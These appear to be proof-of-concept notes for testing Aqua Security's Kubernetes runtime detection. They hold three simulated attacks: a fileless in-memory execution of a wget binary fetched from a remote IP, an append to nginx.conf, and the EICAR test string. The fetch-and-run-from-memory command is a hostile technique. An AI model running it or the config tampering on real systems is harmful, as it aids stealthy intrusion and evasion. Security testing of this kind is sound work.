1. fileless Attack
modify Aqua Server policy
put wget to some http server , like http://10.8.15.200/wget
kubectl apply -f test.yaml
kubectl exec -it fileless -- sh
cd /var/
./memit http://54.235.227.190:8080/wget -- --no-check-certificate https://secure.eicar.org/eicar.com.txt
check logs

2. system file modify
cd /AQUA-POC/02-Runtime/02-2/
kubectl apply -f nginx.yaml
kubectl exec -it nginx -- sh
echo "sfaefaedf" >> /etc/nginx/nginx.conf
check logs
 

3. malware insert
kubectl apply -f cdk.yamll
kubectl exec -it cdk -- sh
vim test.txt
type "X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
save
check logs

